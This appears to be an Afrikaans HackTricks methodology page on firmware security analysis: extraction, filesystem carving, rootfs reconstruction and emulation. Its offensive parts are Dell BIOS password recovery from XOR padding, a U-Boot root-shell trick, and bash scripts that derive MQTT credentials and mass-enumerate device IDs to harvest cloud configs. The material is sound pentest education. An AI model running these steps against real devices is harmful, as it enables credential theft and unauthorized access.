# Firmware-analise

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Inleiding**

### Verwante hulpbronne

Vir verkryging vanaf blootgestelde hardeware-koppelvlakke, sien [UART-konsole-gesteunde firmware-dumping](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) en [SPI-flash-dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Vir ’n herhaalbare UART-opname tydens die selflaaiproses voordat toegang tot die konsole verkry word, sien [SCPI-beheerde krag- en ossilloskoopverkryging](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware is noodsaaklike sagteware wat toestelle in staat stel om korrek te werk deur kommunikasie tussen die hardewarekomponente en die sagteware waarmee gebruikers interaksie het, te bestuur en te fasiliteer. Dit word in permanente geheue gestoor, wat verseker dat die toestel toegang tot belangrike instruksies het sodra dit aangeskakel word, en sodoende die bedryfstelsel laat begin. Die ondersoek en moontlike wysiging van firmware is ’n kritieke stap om sekuriteitskwesbaarhede te identifiseer.<sup>[[2]](#references)[[3]](#references)</sup>

## **Inligting insamel**

**Inligting insamel** is ’n kritieke eerste stap om ’n toestel se samestelling en die tegnologieë wat dit gebruik, te verstaan. Hierdie proses behels die insameling van data oor:

- Die CPU-argitektuur en bedryfstelsel waarop dit loop
- Besonderhede van die selflaaiprogram
- Hardeware-uitleg en databladte
- Metrieke oor die kodebasis en bronliggings
- Eksterne biblioteke en lisensietipes
- Opdateringsgeskiedenis en regulatoriese sertifisering
- Argitektuur- en vloeidiagramme
- Sekuriteitsevaluerings en geïdentifiseerde kwesbaarhede

Vir hierdie doel is **open-source intelligence (OSINT)**-nutsmiddels van onskatbare waarde, asook die ontleding van enige beskikbare open-source sagtewarekomponente deur handmatige en outomatiese hersieningsprosesse. Nutsmiddels soos [Coverity Scan](https://scan.coverity.com) en [Semmle se LGTM](https://lgtm.com/#explore) bied gratis statiese ontleding wat gebruik kan word om potensiële probleme te vind.

## **Firmware verkry**

Firmware kan op verskeie maniere verkry word, elk met ’n eie kompleksiteitsvlak:

- **Direk** vanaf die bron (ontwikkelaars, vervaardigers)
- **Bou** dit volgens verskafde instruksies
- **Laai af** vanaf amptelike ondersteuningswebwerwe
- Gebruik **Google dork**-navrae om firmwarelêers te vind wat aangebied word
- Kry direk toegang tot **cloud storage**, met nutsmiddels soos [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Onderskep **opdaterings** met man-in-the-middle-tegnieke
- **Onttrek** dit van die toestel via verbindings soos **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash), of **PICit**
- **Snuffel** na opdateringsversoeke in toestelkommunikasie
- Identifiseer en gebruik **hardgekodeerde opdaterings-eindpunte**
- **Dump** vanaf die selflaaiprogram of netwerk
- **Verwyder en lees** die stoorskyfie, wanneer niks anders werk nie, met toepaslike hardeware-nutsmiddels

### Slegs UART-logs: dwing ’n root-shell af via U-Boot-omgewingsdata in flash

As UART RX geïgnoreer word (slegs logs), kan jy steeds ’n init-shell afdwing deur die **U-Boot-omgewingsblob** vanlyn te **wysig**:<sup>[[6]](#references)</sup>

1. Dump SPI-flash met ’n SOIC-8-knippie en programmeerder (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Soek die U-Boot env-partisie, wysig `bootargs` om `init=/bin/sh` in te sluit, en **bereken die U-Boot env CRC32 vir die blob weer**.
3. Flits slegs die env-partisie weer en herlaai; ’n shell behoort op UART te verskyn.

Dit is nuttig op ingebedde toestelle waar die bootloader-shell gedeaktiveer is, maar die env-partisie via eksterne flashtoegang skryfbaar is.

## Ontleding van die firmware

Noudat jy **die firmware het**, moet jy inligting daaroor onttrek om te weet hoe om dit te hanteer. Verskillende nutsmiddels wat jy daarvoor kan gebruik:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

As jy nie veel met daardie nutsgoed vind nie, gaan die **entropie** van die image na met `binwalk -E <bin>`; as die entropie laag is, is dit waarskynlik nie geïnkripteer nie. As die entropie hoog is, is dit waarskynlik geïnkripteer (of op een of ander manier saamgepers).

Jy kan hierdie nutsgoed ook gebruik om **lêers wat in die firmware ingebed is** te onttrek:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Of gebruik [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) om die lêer te inspekteer.

### Rou vertoonbates in eksterne flash

'n Eksterne SPI-dump is nie noodwendig die MCU se uitvoerbare firmware nie. Vergelyk vir 'n Cortex-M-teiken die begin van elke moontlike kodegebied met die toestel se geheuekaart: 'n normale vektortabel begin met 'n geloofwaardige SRAM-stapelwyser en 'n reset-handler-adres in uitvoerbare geheue. Die afwesigheid van 'n vektortabel by offset nul bewys op sigself nie dat die hele chip geen kode bevat nie; inspekteer ander offsets en die selflaai-opstelling. As `binwalk` geen houer vind nie, inspekteer die rou grepe en bring flash-leesadresse van 'n [gedekodeerde SPI-opname](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) in verband met aksies wat nuwe skerms laai.<sup>[[14]](#references)</sup>

Probeer vir 'n vertoonbategebied verskillende kandidaat-pixel-formate en afmetings eerder as om PNG/JPEG te aanvaar. Die aangehaalde toestel het **80×160 RGB565 little-endian**-rame gebruik: teen twee grepe per pixel is 'n raam **25,600 grepe** (25 KiB), nie 24 kilobits nie. 'n Gedekodeerde flash-leesadres het die offset van die skermbate aangedui; die navorser het 'n voorbereide image omgeskakel met `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, die ewe groot bate in die oorspronklike dump vervang, dit geskryf met `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin`, en die nuwe image op die skerm bevestig. Dit demonstreer skryfbare *eksterne vertoonbates*, nie die onttrekking of herflitsing van die MCU se interne firmware nie. Bewaar die oorspronklike dump en verifieer die afmetings, byte-volgorde, offset en vervangingslengte voordat jy enigiets skryf.<sup>[[14]](#references)</sup>

### Differensiële flash-ontleding en herstelbare XOR-geheimberging

Wanneer 'n firmware-instelling geen gedokumenteerde bergingsformaat het nie, neem eers verskeie ooreenstemmende flash-lesings, verander **presies een** instelling, dump dan weer die volledige chip en vergelyk die offsets. Herhaal die eksperiment met beheerde waardes om die instelling van tellers en skryfmetadata te onderskei; veranderinge by nuwe offsets eerder as in plek dui op 'n slegs-byvoeging- of log-gestruktureerde berging. Bewaar verwyderde/tombstone-inskrywings, aangesien hul loonvraggrepe moontlik herstelbaar bly.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nadat jy die streek opgespoor het, onttrek die firmware-modules met nutsmiddels soos `binwalk` en reverse-engineer die writer/validator in Ghidra. Bevestig veldgrense, padding, sleutelindeksering en sleutelafleiding in die kode, eerder as om die skema slegs uit ciphertext-patrone af te lei.<sup>[[12]](#references)</sup>

#### Herwin sleutels uit geënkripteerde nulvulling

Soos beskryf in [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), onthul bekende gewone teks die keystream-grepe op dieselfde offsets. ’n Veld met ’n vaste grootte is besonder blootgestel wanneer sy nulvulling elke indeks van ’n herhalende XOR-sleutel dek: die geënkripteerde padding onthul daardie sleutelgrepe direk, omdat `0x00 XOR key_byte = key_byte`. As elke sleutelindeks gedek word, rekonstrueer die sleutel uit die ciphertext se stert en dekripteer die ingevulde grepe.<sup>[[12]](#references)</sup>

Dell se kwesbare DVAR BIOS-wagwoordformaat is ’n konkrete voorbeeld: greep `0` van ’n 32-greep-veld is plaintext, terwyl grepe `1..31` ’n herhalende 20-greep-sleutel gebruik.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Vir ’n wagwoordlengte `L` was posisies `L..31` nul voor XOR. Wanneer `L <= 12`, dek daardie posisies elke sleutelindeks, dus word die volledige sleutel en wagwoord sonder brute force herwin:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Herwin sleutels uit historiese rekords

Moenie elke rekord afsonderlik ontleed nie. Die DVAR-sleutel word ongeveer afgelei as `modified_md5(device_seed || variable_GUID || password[0])`: die toestel-seed en GUID is vas, en die enigste wagwoordafhanklike invoer is die duidelike eerste byte. Dit gee hoogstens 256 sleutels per toestel, en rekords wat met dieselfde byte begin, deel dus ’n sleutel. Groepeer aktiewe en geskrapte rekords volgens daardie byte; ’n kort historiese rekord kan die volle sleutel deur padding leak en ’n huidige langer rekord ontsluit waarvan die eie padding onvoldoende is. Wagwoordrotasie kan dus blootstelling verhoog wanneer ou ciphertext gemerk word vir uitwissing eerder as uitgevee word.<sup>[[12]](#references)</sup>

Die [`dellpwn`](https://github.com/R3n5k1/dellpwn)-nutsmiddel vind DVAR, valideer kandidaat-rekords, herwin wagwoorde en kan rou gestoorde/sleutelgrepe vertoon. Bou dit vanuit ’n checkout en skandeer ’n geverifieerde flash-beeld soos volg:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Vir pasgemaakte parsers: verwerp vals positiewe met behulp van rekordstruktuur, vereistes vir drukbare karakters, kontroles vir nul-opvulling, sleutelentropie en konsekwentheid waar die sleutel omvou. As herhaalde dumps yl biswisselings per skryfbewerking toon, lys die waargenome maskers en rangskik regstellings volgens hierdie beperkings, maar rapporteer dubbelsinnige karakters eerder as om heuristiese uitvoer as presiese herstel aan te bied.<sup>[[12]](#references)</sup>

Wagwoordverifieerders behoort ’n gesoute, herhaalde eenrigting-hash te stoor eerder as omkeerbare ciphertext, en log-gestruktureerde stoorsisteme behoort vervangde geheime materiaal veilig te verwyder.<sup>[[12]](#references)</sup>

### Kry die lêerstelsel

Met die vorige gereedskap met kommentaar, soos `binwalk -ev <bin>`, moes jy die **lêerstelsel kon onttrek**.\
Binwalk onttrek dit gewoonlik in ’n **vouer wat na die lêerstelseltipe vernoem is**, wat gewoonlik een van die volgende is: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Handmatige lêerstelselonttrekking

Soms sal binwalk **nie die magic byte van die lêerstelsel in sy handtekeninge hê nie**. Gebruik in hierdie gevalle binwalk om **die offset van die lêerstelsel te vind en die saamgeperste lêerstelsel** uit die binêre lêer te sny en **onttrek die lêerstelsel handmatig** volgens sy tipe, met behulp van die stappe hieronder.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Voer die volgende **dd command** uit om die Squashfs-lêerstelsel te carve.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatiewelik kan die volgende opdrag ook uitgevoer word.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Vir squashfs (gebruik in die voorbeeld hierbo)

`$ unsquashfs dir.squashfs`

Die lêers sal daarna in die "`squashfs-root`"-gids wees.

- CPIO-argieflêers

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Vir jffs2-lêerstelsels

`$ jefferson rootfsfile.jffs2`

- Vir ubifs-lêerstelsels met NAND-flitsgeheue

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Rekonstruksie van gesplete ingebedde wortellêerstelsels

As ’n rou eMMC/SSD-storting ’n geldige lêerstelselkopstuk bevat, maar sy metadata-afwykings buite die nominale partisie strek, moet dit nie onmiddellik as korrup geklassifiseer word nie. Ingebedde selflaaikode kan die werklike worteltoestel uit verskeie fisiese reekse saamstel deur Device Mapper te gebruik; daarom lewer die uitsny van een GPT-partisie net die eerste segment op.<sup>[[9]](#references)</sup>

#### Triage van die volledige mediabeeld

Verifieer eers dat die verkryging voltooi is, die grootte stabiel is en geen skrywer meer die beeld gebruik nie. As die lêernaam ’n begin-/eindadres kodeer, vergelyk daardie reeks met die werklike aantal grepe. Herstel die GPT in leesalleenmodus en heg slegs die vereiste reeks aan; moenie `vgchange -ay` teen ’n onbetroubare fisiese volume op die werkstasie uitvoer nie, aangesien volume-groepbotsings en onbedoelde skryfbewerkings moontlik is.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Verkies ’n weggooibare VM wanneer die oorspronklike init-logika of ’n LVM-stack die hele image moet sien. Historiese selflaailogboeke van ’n standaard selflaaipartisie is besonder nuttig: die bootloader het dalk proprietêre houer-offsets, komponentlengtes, slotkeuse, belyningsreëls en handtekeningverifikasie aangeteken. Gebruik daardie waardes om ’n ingebedde opdragreël/kernel/initramfs uit te sny, en valideer elke uitvoer onafhanklik met `file`, magiese grepe en `binwalk`; as jy tot aan die einde van die houer lees, kan ’n initrd, ACPI-objek of handtekening per ongeluk agteraan die kernel gevoeg word.<sup>[[9]](#references)</sup>

#### Herwin die selflaaityd-blokkaart

Onttrek die kernel se initramfs en reverse-engineer sy `/init` plus enige bergingsbiblioteke. Volg in [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) stringverwysings vir `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` en partisiepaaie; spoor dan die kode na wat die aktiewe A/B-slot kies en die tabel bou. Nuttige beginpunte in radare2 is `r2 -A init`, `afl`, `pdf @ main` en `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Die lineêre teiken karteer opeenvolgende reekse van ’n virtuele toestel na reekse op een of meer rugliggende toestelle. ’n Herwonne tabel met twee segmente het gewoonlik hierdie vorm (alle posisies en lengtes is 512-grepe-sektore):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Reproduseer die masjienkode-aritmetika presies, insluitend heelgetalwydte, skuiwe en eenheidsomskakelings. Die volgende uitdrukking rond byvoorbeeld ’n grepegrootte af tot ’n 4-KiB-grens en skakel dit eers daarna om na 512-greepsektore; as jy dit met `p4_bytes // 512` vervang, skuif die geselekteerde stert met `p4_bytes % 4096` wanneer die partisie nie op ’n bladsygrens val nie.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Herbou ’n plat analisebeeld deur die reekse in tabelvolgorde met begrensde blokke te kopieer, eerder as om die volledige mediastorting in die geheue te laai. Dit voorkom ook dat mapper-toestelle aan die gasheerkant geskep word. Hou die GPT-afgeleide offsets, omgekeerde sektortellings en resulterende uitvoerlengte as afsonderlike assertions.<sup>[[9]](#references)</sup>

#### Onderskei korrupsie van ’n konstante rekonstruksiefout

Kontroleer vir SquashFS die `hsqs`-magic en dekodeer die little-endian 64-bis `bytes_used`-veld by superblok-offset 40 voordat jy `unsquashfs` uitvoer. As ekstraksie in verskeie onverwante strukture misluk, soek in ’n breë venster rondom die verwagte posisies en vereis sterk strukturele kandidate: ’n dekomprimeerbare metadatablok, verskeie opeenvolgende geldige gidsinskrywings, geloofwaardige inode-velde, ’n wortelinode wat ooreenstem met die inode-telling, of ’n geldige integriteit-metadatustruktuur. ’n Enkele magic-treffer is onvoldoende.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Wanneer dieselfde signed delta onafhanklike strukture geldig maak—byvoorbeeld directory-metadata en ’n verity-rekord—is die waarskynlike oorsaak ’n sistematiese segmentbeginfout eerder as ontbrekende grepe. Gaan terug na die omgekeerde rekenkunde en soek na weggegooide reste, signedness, oorloop of sektor-/bladsyafronding voordat jy probeer om weeskinddata te herstel of lêerstelselmetadata reg te stel.<sup>[[9]](#references)</sup>

Hou laastens beskermingsgrense apart: TPM-sealed LUKS-volumes beskerm datavertroulikheid, terwyl ’n signed dm-verity-mapping die integriteit van die wortellêerstelsel beskerm. ’n Sagteware-TPM herwin nie ’n sleutel wat aan die oorspronklike fisiese TPM verseël is nie, en om ’n gewysigde SquashFS te beginlaai deur ’n init wat slegs vir navorsing bedoel is en wat verity-verifikasie weglaat, vervals nie die handtekening daarvan of breek dm-verity nie.<sup>[[9]](#references)</sup>

## Ontleding van Firmware

Sodra die firmware verkry is, is dit noodsaaklik om dit te ontleed om die struktuur en moontlike kwesbaarhede daarvan te verstaan. Hierdie proses behels die gebruik van verskeie nutsgoed om waardevolle data uit die firmwarebeeld te ontleed en te onttrek.

### Aanvanklike ontledingsnutsgoed

’n Stel opdragte word verskaf vir aanvanklike inspeksie van die binêre lêer (waarna verwys word as `<bin>`). Hierdie opdragte help met die identifisering van lêertipes, die onttrekking van stringe, die ontleding van binêre data en die begrip van die partisie- en lêerstelselbesonderhede:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Om die enkripsiestatus van die image te bepaal, word die **entropy** met `binwalk -E <bin>` nagegaan. Lae entropy dui op ’n gebrek aan enkripsie, terwyl hoë entropy op moontlike enkripsie of kompressie dui.

Vir die onttrekking van **ingebedde lêers** word nutsmiddels en hulpbronne soos die dokumentasie vir **file-data-carving-recovery-tools** en **binvis.io** vir lêerinspeksie aanbeveel.

### Onttrekking van die lêerstelsel

Met `binwalk -ev <bin>` kan ’n mens gewoonlik die lêerstelsel onttrek, dikwels na ’n gids wat na die lêerstelseltipe vernoem is (bv. squashfs, ubifs). Wanneer **binwalk** egter nie die lêerstelseltipe herken nie weens ontbrekende magic bytes, is handmatige onttrekking nodig. Dit behels dat `binwalk` gebruik word om die lêerstelsel se offset te vind, gevolg deur die `dd`-opdrag om die lêerstelsel uit te sny:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Daarna word verskillende opdragte gebruik om die inhoud handmatig te onttrek, afhangend van die lêerstelseltipe (bv. squashfs, cpio, jffs2, ubifs).

### Lêerstelselontleding

Sodra die lêerstelsel onttrek is, begin die soektog na sekuriteitsfoute. Daar word gelet op onveilige netwerkdaemone, hardgekodeerde geloofsbriewe, API-eindpunte, funksies van opdateringsbedieners, ongekompileerde kode, opstartskripte en gecompileerde binêre lêers vir vanlyn ontleding.

**Belangrike liggings** en **items** om te ondersoek, sluit in:

- **etc/shadow** en **etc/passwd** vir gebruikersgeloofsbriewe
- SSL-sertifikate en sleutels in **etc/ssl**
- Konfigurasie- en skriplêers vir moontlike kwesbaarhede
- Ingebedde binêre lêers vir verdere ontleding
- Algemene IoT-toestelwebbedieners en binêre lêers

Verskeie nutsmiddels help om sensitiewe inligting en kwesbaarhede in die lêerstelsel op te spoor:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) en [**Firmwalker**](https://github.com/craigz28/firmwalker) om na sensitiewe inligting te soek
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) vir omvattende firmware-ontleding
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) en [**EMBA**](https://github.com/e-m-b-a/emba) vir statiese en dinamiese ontleding

### Sekuriteitskontroles op gecompileerde binêre lêers

Beide bronkode en gecompileerde binêre lêers wat in die lêerstelsel gevind word, moet vir kwesbaarhede ondersoek word. Nutsmiddels soos **checksec.sh** vir Unix-binêre lêers en **PESecurity** vir Windows-binêre lêers help om onbeskermde binêre lêers te identifiseer wat uitgebuit kan word.

## Oes van wolkkonfigurasie en MQTT-geloofsbriewe via afgeleide URL-tokens

Baie IoT-hubs haal hul toestelspesifieke konfigurasie by ’n wolkeindpunt wat soos volg lyk:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tydens firmware-ontleding kan jy vind dat `<token>` plaaslik van die toestel-ID afgelei word met behulp van ’n hardgekodeerde geheim, byvoorbeeld:

- token = MD5( deviceId || STATIC_KEY ) en voorgestel as heksadesimale hoofletters

Hierdie ontwerp stel enigiemand wat ’n deviceId en die STATIC_KEY te wete kom, in staat om die URL te rekonstrueer en die wolkkonfigurasie op te haal, wat dikwels MQTT-geloofsbriewe in gewone teks en onderwerppresfikse openbaar.

Praktiese werkvloei:

1) Onttrek deviceId uit UART-opstartlogboeke

- Koppel ’n 3.3V UART-adapter (TX/RX/GND) en neem die logboeke vas:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Soek na reëls wat die cloud config-URL-patroon en broker-adres uitvoer, byvoorbeeld:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Herwin STATIC_KEY en token-algoritme uit firmware

- Laai binaries in Ghidra/radare2 en soek na die config path ("/pf/") of MD5-gebruik.
- Bevestig die algoritme (bv. MD5(deviceId||STATIC_KEY)).
- Lei die token in Bash af en maak die digest hoofletters:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Oes cloud-config en MQTT-aanmeldbewyse

- Stel die URL saam en haal JSON met curl op; ontleed dit met jq om geheime te onttrek:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Misbruik plaintext MQTT en swak topic-ACL's (indien teenwoordig)

- Gebruik herwonne credentials om op onderhoudstopics in te teken en soek na sensitiewe gebeure:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Lys voorspelbare toestel-ID's op (op groot skaal, met magtiging)

- Baie ekosisteme bevat verkoper-OUI-/produk-/tipe-grepe gevolg deur 'n opeenvolgende agtervoegsel.
- Jy kan kandidaat-ID's iteratief toets, tokens aflei en configs programmaties ophaal:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notas
- Verkry altyd uitdruklike magtiging voordat jy mass enumeration probeer.
- Verkies emulasie of statiese analise om geheime te herwin sonder om teikenhardeware te wysig, waar moontlik.


Die proses om firmware te emuleer, maak **dinamiese analise** van óf ’n toestel se werking óf ’n individuele program moontlik. Hierdie benadering kan uitdagings met hardeware- of argitektuurafhanklikhede teëkom, maar die oordrag van die root filesystem of spesifieke binaries na ’n toestel met ’n ooreenstemmende argitektuur en bytevolgorde, soos ’n Raspberry Pi, of na ’n voorafgeboude virtuele masjien, kan verdere toetsing vergemaklik.

### Emulasie van individuele binaries

Wanneer enkele programme ondersoek word, is dit noodsaaklik om die program se bytevolgorde en SVE-argitektuur te identifiseer.

#### Voorbeeld met MIPS-argitektuur

Om ’n binary met ’n MIPS-argitektuur te emuleer, kan jy die opdrag gebruik:

```bash
file ./squashfs-root/bin/busybox
```

En om die nodige emulasienutsgoed te installeer:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Vir MIPS (big-endian) word `qemu-mips` gebruik, en vir little-endian-binaries is `qemu-mipsel` die keuse.

#### Emulasie van ARM-argitektuur

Vir ARM-binaries is die proses soortgelyk, met die `qemu-arm`-emulator wat vir emulasie gebruik word.

### Volledige stelselemulasie

Gereedskap soos [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) en ander maak volledige firmware-emulasie moontlik, outomatiseer die proses en help met dinamiese analise.

### Herbou van gesplete en geverifieerde wortellêerstelsels vir emulasie

As ’n SquashFS-superblok leesbaar is, maar inode-, gids- of fragmenttabel-offsets onmoontlik lyk, moet jy nie dadelik `unsquashfs` patch nie. Reverse-engineer die vroeë boot-binêre lêer en boots die bloktoestelgrafiek wat dit skep, na: ingebedde stelsels kan ’n nominale wortelpartisie blootstel, maar die werklike lêerstelsel bou met ’n `dm-linear`-kartering wat sektore wat by ’n ander partisie geleen is, aanlas. Kontroles wat net die superblok nagaan, kan slaag selfs wanneer elke daaropvolgende metadatablok verskuif is.<sup>[[11]](#references)</sup>

Behou die firmware se rekenkunde presies. Bepaal veral of lengtes in grepe, 512-greep-sektore of 4 KiB-bladsye uitgedruk word; boots verskuiwings en afkapping in hul oorspronklike volgorde na; en hou rekening met bankafhanklike eindstreke in A/B-uitlegte. Byvoorbeeld, `(partition_bytes >> 12) << 3` kap eers af tot ’n 4 KiB-grens en druk die resultaat daarna in 512-greep-sektore uit; as jy dit vervang met `partition_bytes // 512`, kan die aangelaste omvang met ’n paar kilogrepe verskuif en alle daaropvolgende SquashFS-tabelle beskadig.<sup>[[11]](#references)</sup>

’n Nuttige valideringswerkvloei is:<sup>[[11]](#references)</sup>

1. Herwin elke `dm-linear`-segment se brontoestel, beginsektor en lengte uit die verifier/init-binêre lêer.
2. Verbind of karteer die omvang sonder om hul belyningssemantiek te verander.
3. As ekstraksie steeds misluk, soek slegs binne ’n klein venster rondom die voorspelde grens en vereis verskeie opeenvolgende geldige metadatastrukture, eerder as om net ’n geloofwaardige superblok te aanvaar.
4. Voer ’n onveranderde `unsquashfs` teen die herboude beeld uit; suksesvolle deurloop van alle gidse en fragmente is sterker bewys as `unsquashfs -stat`.

#### Ontlederbeheerde dm-verity-vervanging

Wanneer die ontleder die QEMU-kern, initramfs en virtuele skywe beheer, kan ’n aangepaste wortel gelaai word deur die verskaffer se verifikasie-PID 1 met ’n klein staties-gekoppelde init te vervang. Dit is ’n **laboratoriumvervanging van die bootketting**, nie ’n omseiling van dm-verity, sy RSA-handtekening, Secure Boot of ’n TPM-verseëlde sleutel nie.<sup>[[11]](#references)</sup>

Die vervangende init behoort die operasionele dele van die oorspronklike bootpad na te boots: monteer `devtmpfs`, roep `setsid()` aan, koppel `/dev/console` aan lêerbeskrywers 0–2, monteer `/proc` en `/sys`, wag vir die verskafte bloktoestel, monteer die gewysigde wortel as leesalleen, ontkoppel die pseudo-lêerstelsels van die ou wortel, verskuif die nuwe mount na `/`, voer `chroot` uit en roep `execve()` aan met die firmware se oorspronklike `/sbin/init`. Deur `/dev`, `/proc` en `/sys` **voor** `MS_MOVE` te ontkoppel, voorkom jy dat mount-punte wat aan die nuwe wortel behoort, per ongeluk ontkoppel word.<sup>[[11]](#references)</sup>

Hou veranderbare toesteltoestand apart van die gewysigde onveranderlike wortel. ’n qcow2-overlay kan die oorspronklike skyf se LVM-toestand behou, terwyl ’n tweede leesalleen virtio-skyf die gewysigde SquashFS verskaf:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Ontfouting van vanlyn beeldtoestand

